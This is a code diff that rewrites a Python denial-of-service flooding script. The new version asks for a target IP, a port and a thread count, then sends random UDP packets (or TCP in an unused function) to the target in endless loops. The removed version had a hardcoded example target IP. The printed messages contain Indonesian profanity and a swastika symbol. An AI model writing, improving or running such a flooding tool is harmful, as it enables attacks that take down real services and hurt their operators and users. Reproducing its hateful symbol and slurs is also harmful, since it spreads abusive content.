@@ -1,38 +1,65 @@
 
-import time
-import socket
+#!/usr/bin/env python3
+#Code by rafli
 import random
-import sys
+import socket
+import threading
 
-def usage():
-    print "Command: " + sys.argv[0] + " <3.235.171.149> <7777> <9999999>"
-    print "varoo"
-    print "Jangan pake tools ini sembarangan ya, kontol "
-    print "DDOS By kontolodon "
+print("~~~ DDOS TOOLS ~~~")
+print("~~~ kata mamah varo ~~~")
+print("~~~ Jangan disalah gunakan ~~~")
+print("~~~ Script alvaro nih boss 卐 ~~~")
+print("~~~ Gas keun hayyukk(stress) ~~~")
 
-def flood(victim, vport, duration):
-    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # 1024 representes one byte to the server
-    bytes = random._urandom(1024)
-    timeout =  time.time() + duration
-    sent = 999999
+ip = str(input(" Target Ip:"))
+port = int(input(" Target Port:"))
+choice = str(input(" UDP(y/n):"))
+times = int(input(" Paket yang dikirim ke target:"))
+threads = int(input(" Threads yang dikirim:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Down ga? Down lah masa kaga rafli dilawan")
+		except:
+			print("[!] Error tod")
 
-    while 1:
-        if time.time() > timeout:
-            break
-        else:
-            pass
-        client.sendto(bytes, (victim, vport))
-        sent = sent + 1
-        print "lagi nyerang memek %s attack by varokontol %s wadohh abuse %s "%(sent, victim, vport)
+def run2():
+	data = random._urandom(2000)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" lagi ngirim cok script by alvaro 卐")
+		except:
+			print("[!] Error aokwowkkw ")
 
-def main():
-    print len(sys.argv)
-    if len(sys.argv) != 4:
-        usage()
-    else:
-        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
-
-if __name__ == '__main__':
-    main()
+def run3():
+	data = random._urandom(3024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" lagi ngirim cok script by alvaro 卐")
+		except:
+			s.close()
+			print("[*] Error tod")            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
